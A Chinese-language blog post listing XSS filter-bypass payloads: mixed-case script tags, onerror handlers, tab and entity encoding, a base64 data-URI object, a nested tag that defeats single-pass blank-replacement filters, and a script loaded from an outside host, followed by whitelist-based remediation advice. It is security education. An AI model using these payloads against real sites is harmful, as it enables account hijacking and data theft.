<!DOCTYPE html><html lang="zh-CN"><head><meta name="generator" content="Hexo 3.8.0"><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="author" content="vQAQv"><meta name="description" content="喜欢电影，喜欢美食，喜欢旅游，也喜欢你💖~"><link rel="icon" href="/favicon.png"><title>XSS绕过技巧 - vQAQv's blog | Just Do It!</title><link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css"><!--[if lt IE 9]><script>(function(a,b){a="abbr article aside audio bdi canvas data datalist details dialog figcaption figure footer header hgroup main mark meter nav output progress section summary template time video".split(" ");for(b=a.length-1;b>=0;b--)document.createElement(a[b])})()</script><![endif]--><script src="/js/jquery-3.1.1.min.js"></script><script src="/js/fancybox/jquery.fancybox.min.js"></script></head><body style="opacity:1"><header class="head"><h1 class="head-title u-fl"><a href="/">vQAQv's blog | Just Do It!</a></h1><nav class="head-nav u-fr"><ul class="head-nav__list"><li class="head-nav__item"><a class="head-nav__link" href="/archives">Archives</a></li><li class="head-nav__item"><a class="head-nav__link" href="/about">About Me</a></li></ul></nav></header><main class="main"><article class="post"><header class="post__head"> <time class="post__time" datetime="2016-08-28T02:47:54.000Z">八月 28, 2016</time><h1 class="post__title"><a href="/2016/08/28/XSS绕过技巧/">XSS绕过技巧</a></h1><div class="post__main echo"><p>经过看书和实战，下面进行了一些个人的总结</p>
<h1 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h1><p>一般进行XSS测试先对其过滤字符、限制长度搞清楚。</p>
<p>首先:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xss</span>&gt;</span>xss'"</span><br></pre></td></tr></table></figure></p>
<p>然后看其结果过滤了什么，转义了什么，再进行相对应得措施。</p>
<h1 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h1><h2 id="HTML-url编码绕过"><a href="#HTML-url编码绕过" class="headerlink" title="HTML url编码绕过"></a>HTML url编码绕过</h2><p>在一次挖洞时用Burp 拦截，其编码方式是html编码，于是把所要插入的代码进行编码然后重发，便轻松实现绕过。</p>
<h2 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h2><p>这个是因为系统的问题，因为在windows系统中是大小写不敏感的，WINDOWS和WinDows是被当做一样的字符串处理。<br>而linux系统是大小写敏感的。</p>
<p>正常情况的xss攻击代码是<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert('XSS');</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">#有时候用大小写就可绕过其过滤字符</span><br><span class="line"><span class="tag">&lt;<span class="name">ScRipt</span>&gt;</span><span class="undefined">AlErT('XSS');</span><span class="tag">&lt;/<span class="name">ScRiPT</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="通过error事件触发alert"><a href="#通过error事件触发alert" class="headerlink" title="通过error事件触发alert"></a>通过error事件触发alert</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">'#'</span> <span class="attr">onerror</span>=<span class="string">alert(</span>"<span class="attr">XSS</span>")&gt;</span></span><br><span class="line">#无引号无分号</span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">javascript:alert(</span>'<span class="attr">XSS</span>')&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="内嵌TAB-或者回车"><a href="#内嵌TAB-或者回车" class="headerlink" title="内嵌TAB(或者回车)"></a>内嵌TAB(或者回车)</h3><p>用来分开xss攻击代码<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"jav   ascript:alert('XSS');"</span>&gt;</span><span class="tag">&lt;/<span class="name">img</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h3 id="内嵌被编码的TAB"><a href="#内嵌被编码的TAB" class="headerlink" title="内嵌被编码的TAB"></a>内嵌被编码的TAB</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">"jav&amp;#x09;ascript:alert('XSS');"</span>&gt;</span><span class="tag">&lt;/<span class="name">img</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="闭合标签绕过"><a href="#闭合标签绕过" class="headerlink" title="闭合标签绕过"></a>闭合<html>标签绕过</html></h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert("XSS");</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="无过滤绕过"><a href="#无过滤绕过" class="headerlink" title="无过滤绕过"></a>无过滤绕过</h2><p>这是一个常规的xss注入代码，虽然通常它会被防御，但是我们建议首先去尝试它。（引号是不被需要的在任何现代浏览器中，因此这里省略了它。）<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://ha.ckers.org/xss.js</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="十进制html编码"><a href="#十进制html编码" class="headerlink" title="十进制html编码"></a>十进制html编码</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="结尾没有分号的十进制html编码"><a href="#结尾没有分号的十进制html编码" class="headerlink" title="结尾没有分号的十进制html编码"></a>结尾没有分号的十进制html编码</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="实际中遇到绕过-“以子之盾攻子之盾”"><a href="#实际中遇到绕过-“以子之盾攻子之盾”" class="headerlink" title="实际中遇到绕过 - “以子之盾攻子之盾”"></a>实际中遇到绕过 - “以子之盾攻子之盾”</h2><p>简单的过滤1：<br><img src="/image/xss/xss_1.png" alt="xss1"></p>
<p>简单的过滤2：<br><img src="/image/xss/xss_2.png" alt="xss2"></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">//2019-07-05更新</span><br><span class="line">简单的过滤1：</span><br><span class="line">由于只是简单的过滤掉 "on"事件,以及替换掉script标签、javascript伪协议.</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">'data:text/html;base64,PHNjcmlwdD5hbGVydCgnYWFhJyk8L3NjcmlwdD4='</span>&gt;</span></span><br><span class="line">//base64 解码：<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert('aaa')</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">简单的过滤2：</span><br><span class="line">在第一次的绕过之后,在原本的代码基础上加了对iframe、object、form标签的黑名单.</span><br><span class="line">但关键是对匹配到的字符串替换为空.这样可以利用该防御手段来作为攻击手段.从而达到</span><br><span class="line"></span><br><span class="line">"以子之盾攻子之盾"</span><br><span class="line">利用其对JavaScript替换为空的操作,插在我们的标签内,即可绕过.</span><br><span class="line"></span><br><span class="line">原理很简单,过滤只进行了一遍,在替换为空后拼接成了新的标签script.由于不可能采取递归式的进行过滤,因此绕过了该次的补丁.</span><br><span class="line"><span class="tag">&lt;<span class="name">scripjavascript:t</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h1 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h1><p>XSS的修复不同于sql注入,黑名单难于枚举的完全。故一般采用白名单的修复方案。对标签白名单、事件白名单、以及属性也要白名单。</p>
<p>其中富文本的XSS往往因为采用黑名单导致过滤不全导致被绕过。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">XXS Filter</span><br><span class="line"></span><br><span class="line">Anti-Samy:是OWASP上的一个开源项目。基于JAVA，现在拓展到.NET</span><br><span class="line">https://www.owasp.org/index.php/Ctategory:OWASP_AntiSamy_Project</span><br><span class="line"></span><br><span class="line">HTMLPurify:PHP:</span><br><span class="line">https://htmlpurifier.org</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HTML5 Security Cheatsheey:</span><br><span class="line">http://code.google.com/p/html5security</span><br></pre></td></tr></table></figure>
<h1 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h1><p><a href="https://wizardforcel.gitbooks.io/owasp-cheat-sheet-zh/content/xss-filter-evasion-cheat-sheet.html" target="_blank" rel="noopener">XSS 过滤绕过备忘单</a></p>
</div></header><footer class="post__foot u-cf"><ul class="post__tag u-fl"><li class="post__tag__item"><a class="post__tag__link" href="/tags/xss/">xss</a></li><li class="post__tag__item"><a class="post__tag__link" href="/tags/绕过技巧/">绕过技巧</a></li></ul></footer></article><section class="reward"> <a class="btn-reward" href="#">Contact me</a><div class="reward-wrapper clearfix"><img src="/img/wechat.png" title="微信"></div></section></main><footer class="foot"><div class="foot-copy">&copy; 2016-2019 vQAQv</div></footer><script src="/js/scroller.js"></script><script src="/js/main.js"></script></body></html>